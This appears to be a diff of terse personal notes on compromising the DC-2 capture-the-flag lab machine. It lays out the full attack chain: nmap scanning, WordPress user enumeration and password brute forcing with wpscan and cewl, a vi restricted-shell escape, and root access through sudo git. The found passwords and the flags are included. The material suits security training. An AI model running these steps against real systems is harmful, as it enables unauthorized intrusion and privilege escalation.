@@ -1,14 +1,103 @@
-sudo nmap -sV -sC 192.168.220.194
+sudo nmap -sV -sC -p- 192.168.220.194
 
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.10 ((Debian))
-|_http-title: Did not follow redirect to http://dc-2/
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
 |_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: DC-2 &#8211; Just another WordPress site
+|_http-generator: WordPress 4.7.10
+7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
+|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
+|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
+|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+open ports 7744 ssh, 80 http
 
 
 sudo nano /etc/hosts
 
 192.168.220.194   dc-2
+
+wpscan --url http://dc-2 --enumerate p --enumerate t --enumerate u
+
+admin
+jerrry
+tom
+
+cewl http://dc-2/ > password
+
+nano users
+admin
+jerry
+tom
+
+wpscan --url http://dc-2 -U users -P password 
+
+
+[!] Valid Combinations Found:
+ | Username: jerry, Password: adipiscing
+ | Username: tom, Password: parturient
+
+ls $PATH
+
+less local.txt USERFLAG
+
+echo $PATH
+ls /home/tom/usr/bin
+
+
+https://gtfobins.github.io/gtfobins/vi/#shell
+
+vi
+:set shell=/bin/sh
+:shell
+
+
+
+export PATH=/bin:/usr/bin:$PATH
+export SHELL=/bin/bash:$SHELL
+
+jerry@DC-2:/home/tom$ sudo -l
+Matching Defaults entries for jerry on DC-2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jerry may run the following commands on DC-2:
+    (root) NOPASSWD: /usr/bin/git
+jerry@DC-2:/home/tom$ sudo git help add
+
+!/bin/bash
+ 
+ 
+
+root@DC-2:/home/tom# ls
+flag3.txt  local.txt  usr
+root@DC-2:/home/tom# cd /root
+root@DC-2:~# ls
+final-flag.txt  proof.txt
+
+root@DC-2:~# cat proof.txt
+
+ROOTFLAG
+
+root@DC-2:~# cat final-flag.txt
+
+ __    __     _ _       _                    _ 
+/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
+\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
+ \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
+  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   
+
+
+Congratulatons!!!
+
+A special thanks to all those who sent me tweets
+and provided me with feedback - it's all greatly
+appreciated.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+
 
 
 
